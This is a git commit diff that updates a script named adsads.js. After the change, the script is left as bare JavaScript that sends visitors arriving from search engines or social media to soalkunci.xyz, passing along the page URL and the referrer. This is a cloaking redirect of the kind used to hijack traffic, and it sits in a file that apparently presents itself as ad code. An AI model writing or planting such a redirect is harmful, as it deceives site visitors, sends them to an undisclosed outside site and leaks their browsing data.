1a5cf306bf69c1aa4e7ada6db5418afa6377eaec
xerisahu <92183349+xerisahu@users.noreply.github.com>
2022-08-02 06:03:32 +0700

    Update adsads.js

--- adsads.js
+++ adsads.js
@@ -1,7 +1,4 @@
-<script>
-  //<![CDATA[
 var ars = 'https://soalkunci.xyz';
 
 if(['.google.', 'bing.', 'yandex.', 'facebook.', 'pinterest.'].some(s => document.referrer.toLowerCase().includes(s)) || ['fb', 'facebook', 'pinterest', 'twitter'].some(s => navigator.userAgent.toLowerCase().includes(s))){ window.location.href = ars + '/?arsae='+ encodeURIComponent(window.location.href) + '&arsae_ref='+ encodeURIComponent(document.referrer) }
-//]]>
-</script>
+
